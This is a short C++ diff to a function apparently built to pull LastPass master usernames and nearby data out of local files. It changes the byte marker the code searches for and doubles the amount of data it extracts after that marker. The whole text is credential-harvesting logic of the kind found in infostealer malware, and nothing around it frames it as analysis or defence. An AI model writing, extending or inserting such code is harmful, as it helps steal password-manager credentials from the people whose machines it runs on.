@@ -12,7 +12,7 @@ int getCredslastpassMasterUsername(std::string filename) {
         return 1;
     }
 
-    std::string searchSequence = "lpusername=\"";
+    std::string searchSequence = "\"baseUrl\"";
     std::vector<char> foundData;
 
     while (!file.eof()) {
@@ -22,9 +22,9 @@ int getCredslastpassMasterUsername(std::string filename) {
         if (c == searchSequence[foundData.size()]) {
             foundData.push_back(c);
             if (foundData.size() == searchSequence.size()) {
-                // We found the search sequence, now collect the next 100 binary characters
+                // We found the search sequence, now collect the next 200 binary characters
                 std::vector<char> extractedData;
-                for (int i = 0; i < 100; i++) {
+                for (int i = 0; i < 200; i++) {
                     file.get(c);
                     if (file.eof()) {
                         break;
